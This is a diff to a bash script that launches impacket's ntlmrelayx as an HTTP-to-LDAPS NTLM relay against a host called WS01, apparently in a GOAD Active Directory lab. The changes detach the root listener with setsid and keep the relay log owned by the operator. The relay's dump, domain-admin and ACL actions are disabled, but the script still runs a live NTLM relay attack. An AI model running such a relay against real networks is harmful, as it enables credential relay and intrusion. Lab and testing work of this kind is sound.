@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Start a mutation-disabled HTTP -> LDAPS relay for deterministic WS01 machine authentication.
-# Launch in a detached root-owned nohup context and track the real TCP/80 listener PID.
+# Keep evidence user-owned while detaching the privileged relay with setsid.
 set -euo pipefail
 
 ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
@@ -28,27 +28,36 @@ pid_cmdline() {
   sudo sh -c "tr '\\0' ' ' < /proc/$pid/cmdline" 2>/dev/null || true
 }
 
+show_log() {
+  if [[ -r "$LOG" ]]; then
+    cat "$LOG" >&2
+  elif [[ -e "$LOG" ]]; then
+    sudo cat "$LOG" >&2 || true
+  fi
+}
+
 cd "$ROOT"
 
 bash "$ROOT/scripts/phase03/check-http-ldaps-readonly-relay.sh"
 
 NTLMRELAYX="$(find_ntlmrelayx)"
-sudo -v
+command -v setsid >/dev/null 2>&1 || { echo 'FAIL: setsid not found' >&2; exit 1; }
 
+sudo -v
 umask 077
+
 rm -rf -- "$WORK"
 mkdir -p "$WORK"
 
-# Launch through a short-lived privileged shell so nohup/redirects are applied
-# by root. stdbuf execs ntlmrelayx, so the child remains detached from this
-# wrapper after the shell exits.
-sudo -n sh -c '
-  umask 077
-  nohup stdbuf -oL -eL "$1"     -t "ldaps://$2"     --no-dump     --no-da     --no-acl     --no-smb-server     --no-wcf-server     --no-raw-server     >"$3" 2>&1 </dev/null &
-  printf "%s\n" "$!"
-' sh "$NTLMRELAYX" "$TARGET" "$LOG" >"$WORK/launch.pid"
+# Create all retained evidence as the unprivileged operator before starting
+# the privileged listener. Root writes through already-open file descriptors;
+# file ownership therefore remains with the operator.
+: >"$LOG"
+chmod 600 "$LOG"
 
-LAUNCH_PID="$(cat "$WORK/launch.pid")"
+# setsid -f forks a new session and returns immediately. stdin is detached and
+# stdout/stderr stay attached only to the user-owned log file.
+sudo -n setsid -f stdbuf -oL -eL "$NTLMRELAYX"   -t "ldaps://$TARGET"   --no-dump   --no-da   --no-acl   --no-smb-server   --no-wcf-server   --no-raw-server   </dev/null >>"$LOG" 2>&1
 
 REAL_PID=""
 for _ in {1..30}; do
@@ -68,8 +77,8 @@ for _ in {1..30}; do
 done
 
 if [[ -z "$REAL_PID" ]]; then
-  echo "FAIL: could not identify the ntlmrelayx process owning TCP/80 (launch pid=$LAUNCH_PID)" >&2
-  cat "$LOG" >&2
+  echo 'FAIL: could not identify the ntlmrelayx process owning TCP/80' >&2
+  show_log
   exit 1
 fi
 
@@ -81,24 +90,43 @@ grep -Eqi 'ntlmrelayx' <<<"$CMDLINE" || {
 
 sudo kill -0 "$REAL_PID" 2>/dev/null || {
   echo "FAIL: ntlmrelayx listener PID $REAL_PID is not alive" >&2
-  cat "$LOG" >&2
+  show_log
   exit 1
 }
 
 printf '%s\n' "$REAL_PID" >"$PIDFILE"
+chmod 600 "$PIDFILE"
 
-# Prove it survives beyond initial listener creation.
-sleep 3
+# Ensure this is not a transient listener that disappears when the launcher
+# finishes.
+for second in 1 2 3 4 5; do
+  sleep 1
+  CHECK_PID="$(listener_pid_80 || true)"
 
-CHECK_PID="$(listener_pid_80 || true)"
-[[ "$CHECK_PID" == "$REAL_PID" ]] || {
-  echo "FAIL: ntlmrelayx listener did not survive detached startup" >&2
-  cat "$LOG" >&2
+  if [[ "$CHECK_PID" != "$REAL_PID" ]]; then
+    echo "FAIL: ntlmrelayx listener did not survive detached startup at t=${second}s" >&2
+    show_log
+    exit 1
+  fi
+done
+
+LOG_OWNER="$(stat -Lc '%U' "$LOG")"
+LOG_MODE="$(stat -Lc '%a' "$LOG")"
+
+[[ "$LOG_OWNER" == "$(id -un)" ]] || {
+  echo "FAIL: relay log owner is $LOG_OWNER, expected $(id -un)" >&2
+  exit 1
+}
+
+[[ "$LOG_MODE" == "600" ]] || {
+  echo "FAIL: relay log mode is $LOG_MODE, expected 600" >&2
   exit 1
 }
 
 echo "TARGET=ldaps://$TARGET"
 echo "LOG=$LOG"
+echo "LOG_OWNER=$LOG_OWNER"
+echo "LOG_MODE=$LOG_MODE"
 echo "PID=$REAL_PID"
 echo "CMDLINE=$CMDLINE"
 echo 'PHASE03_HTTP_LDAPS_RUNTIME_READY=True'
